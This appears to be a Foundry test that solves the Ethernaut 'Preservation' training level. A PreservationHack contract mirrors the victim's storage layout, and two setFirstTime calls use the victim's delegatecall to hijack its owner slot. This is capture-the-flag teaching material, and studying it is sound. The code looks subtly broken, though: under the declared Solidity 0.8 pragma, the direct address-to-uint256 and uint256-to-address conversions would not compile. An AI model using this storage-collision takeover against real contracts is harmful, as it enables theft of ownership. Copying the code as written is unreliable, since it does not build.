// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Preservation/PreservationFactory.sol";
import "../src/Ethernaut.sol";

// forge test --match-contract PreservationTest -vvvv
contract PreservationTest is Test {
    Ethernaut ethernaut;
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
        vm.deal(player2, 1 ether);
    }

    function testPreservationHack() public {
        /****************
         * Factory setup *
         *************** */
        PreservationFactory PreservationFactory = new PreservationFactory();
        ethernaut.registerLevel(PreservationFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(
            PreservationFactory
        );
        Preservation ethernautPreservation = Preservation(levelAddress);
        /****************
         *    Attack     *
         *************** */
        PreservationHack preservationHack = new PreservationHack(levelAddress);
        /*
         *
         */
        ethernautPreservation.setFirstTime(uint256(address(preservationHack)));
        ethernautPreservation.setFirstTime(uint256(player));

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract PreservationHack {
    Preservation challenge;
    // mimim the `Preservation` contract layout structure
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor(address _victim) {
        challenge = Preservation(_victim);
    }

    function setTime(uint256 time) public {
        // Convert the `time` input to an `address` and update the `owner` state variable
        owner = address(time);
    }
}
